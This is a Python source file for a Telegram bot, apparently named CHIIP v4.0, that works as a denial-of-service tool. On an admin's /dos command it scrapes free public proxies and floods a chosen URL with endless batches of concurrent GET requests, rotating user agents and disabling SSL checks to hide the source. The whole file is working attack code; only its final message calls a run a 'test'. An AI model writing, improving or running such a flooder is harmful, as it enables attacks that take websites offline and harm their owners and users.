import os
import asyncio
import logging
import random
import aiohttp
from aiohttp import web, ClientSession, ClientTimeout
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command

# --- CONFIG ---
API_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
stop_flag = False
proxy_list = []

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
]

# --- ФУНКЦИЯ СКРЕЙПИНГА ПРОКСИ ---
async def fetch_proxies():
    global proxy_list
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        async with ClientSession() as session:
            async with session.get(url) as resp:
                text = await resp.text()
                proxy_list = [f"http://{p.strip()}" for p in text.split('\n') if p.strip()]
                print(f"✅ Обновлено прокси: {len(proxy_list)}")
    except Exception as e:
        print(f"❌ Ошибка загрузки прокси: {e}")

# --- ЛОГИКА АТАКИ ---
async def attack_logic(url, threads, message):
    global stop_flag
    stop_flag = False
    await fetch_proxies() # Загружаем прокси перед стартом
    
    timeout = ClientTimeout(total=10)
    count = 0

    async with ClientSession(timeout=timeout) as session:
        while not stop_flag:
            tasks = []
            for _ in range(threads):
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                proxy = random.choice(proxy_list) if proxy_list else None
                
                # Создаем задачу запроса
                tasks.append(asyncio.create_task(
                    session.get(url, headers=headers, proxy=proxy, ssl=False)
                ))
            
            # Выполняем пачку запросов
            await asyncio.gather(*tasks, return_exceptions=True)
            count += threads
            
            if count % 500 == 0:
                print(f"DEBUG: Sent {count} requests")
            
            await asyncio.sleep(0.05) # Минимальная пауза для стабильности Render

    await message.answer(f"🛑 Тест CHIIP v4.0 окончен.\n🎯 Цель: {url}\n📤 Запросов: {count}")

# --- ОСТАЛЬНЫЕ ХЕНДЛЕРЫ (БЕЗ ИЗМЕНЕНИЙ) ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("🛸 **CHIIP v4.0: Proxy Edition**\n\nБот теперь сам ищет прокси перед атакой.")

@dp.message(Command("dos"))
async def cmd_dos(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3: return
    asyncio.create_task(attack_logic(args[1], int(args[2]), message))
    await message.answer(f"🔥 **Запуск через прокси!**\nЦель: {args[1]}")

@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    global stop_flag
    if message.from_user.id != ADMIN_ID: return
    stop_flag = True
    await message.answer("⌛ Остановка...")

async def main():
    # Запуск веб-сервера для Render (как в v3.0)
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="CHIIP v4.0"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.getenv("PORT", 8080))).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())